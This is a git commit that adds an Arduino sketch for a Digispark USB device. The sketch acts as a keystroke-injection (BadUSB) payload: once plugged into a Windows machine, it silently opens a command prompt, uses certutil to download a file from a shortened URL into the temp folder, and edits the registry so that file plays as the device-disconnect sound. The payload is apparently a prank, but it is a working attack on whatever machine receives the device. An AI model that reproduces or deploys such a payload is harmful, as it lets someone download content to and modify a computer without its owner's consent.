ef5e6ae087b723ea6294ca7cbcc7f0922f2c5701
Hiship <hiship@xythol.com>
2021-02-21 02:19:13 -0700

    forgot some files there...

---
+++ horse.ino
@@ -0,0 +1,14 @@
+#include "DigiKeyboard.h"
+void setup() { //execute once
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("cmd /C start /MIN cmd /C powershell certutil -urlcache -split -f 'http://bit.do/horse85' $env:temp/s.wav;reg add HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default\\DeviceDisconnect\\.Current\\ /t REG_SZ /d  $env:temp/s.wav /f");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+}
+
+void loop() {
+
+  }
